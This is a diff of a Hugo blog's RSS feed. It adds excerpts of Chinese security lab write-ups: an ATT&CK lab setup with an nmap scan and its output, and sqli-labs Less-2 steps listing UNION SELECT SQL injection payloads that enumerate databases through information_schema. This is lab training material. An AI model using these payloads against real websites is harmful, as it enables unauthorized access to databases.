@@ -9,7 +9,27 @@
       <link>https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Tue, 20 Jul 2021 17:19:55 +0800</lastBuildDate><atom:link href="https://oopsdc.tk/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 21 Jul 2021 14:34:21 +0800</lastBuildDate><atom:link href="https://oopsdc.tk/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ATT&amp;CK实战一</title>
+      <link>https://oopsdc.tk/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/</link>
+      <pubDate>Wed, 21 Jul 2021 14:34:21 +0800</pubDate>
+      
+      <guid>https://oopsdc.tk/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/</guid>
+      <description>一、环境搭建 1.1 下载虚拟机文件 自行搜索。
+1.2 环境介绍 本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。
+Kali:自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 &amp;lt;ip&amp;gt;即可。
+Win7:双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。
+Win2k3:只有内网网卡，IP:192.168.52.138，使用VMnet2。
+Win2k8 R2:只有内网网卡，IP:192.168.52.141，使用VMnet2。
+拓扑图如下:
+![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)
+安装完成之后在Win7主机上打开phpstudy开启Web服务。
+二、信息收集 2.1 探测存活主机 命令:
+nmap -sS -sV -O 192.168.106.0/24# 此处的IP为NAT模式下Win7和Kali自动获取到的IP# 参数说明sS	:	SYN半连接扫描，只进行前两次握手sV	:	显示服务器详细版本O	:	显示服务器操作系统(不太准确)结果:
+Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.</description>
+    </item>
+    
     <item>
       <title>APNs推送机制</title>
       <link>https://oopsdc.tk/post/%E6%B5%85%E6%9E%90ios-apns%E6%8E%A8%E9%80%81%E6%9C%BA%E5%88%B6/</link>
@@ -81,6 +101,12 @@ route add default gw 10.7.150.1再使用route命令验证一下，确认配好�
 爆库名:id=-1&#39;union select 1,database(),group_concat(schema_name) from information_schema.schemata
 爆表名:id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_name=database()
 爆字段:id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=database()
+Less-2 传入id=1 and 1=1页面正常，id=1 and 1=2页面无回显，判断为数字型注入。
+使用id=-1 order by语句测试有几列数据，当id=-1 order by 4时页面报错，所以有3列数据。
+使用联合查询语句id=-1 union select 1,2,3判断是否有回显位，2、3为回显位。
+查看当前数据库名:id=-1 union select 1,database(),3
+爆库名:id=-1 union select 1,database(),group_concat(schema_name) from information_schema.schemata
+后续操作跟前一关一样。
  本文链接:sqli-labs | Atmet (oopsdc.tk)
 文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
  </description>
